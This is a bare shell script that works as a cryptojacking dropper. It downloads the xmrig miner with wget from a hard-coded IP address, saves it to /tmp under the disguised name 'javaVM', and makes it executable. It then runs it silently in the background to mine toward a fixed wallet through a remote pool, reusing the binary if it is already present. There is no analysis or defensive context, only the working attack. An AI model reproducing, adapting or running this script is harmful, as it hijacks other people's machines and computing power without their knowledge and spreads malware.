#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM -o 	103.228.74.80:443 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q http://150.136.168.71:80/archxx/xmrig -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM -o 103.228.74.80:443 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
fi
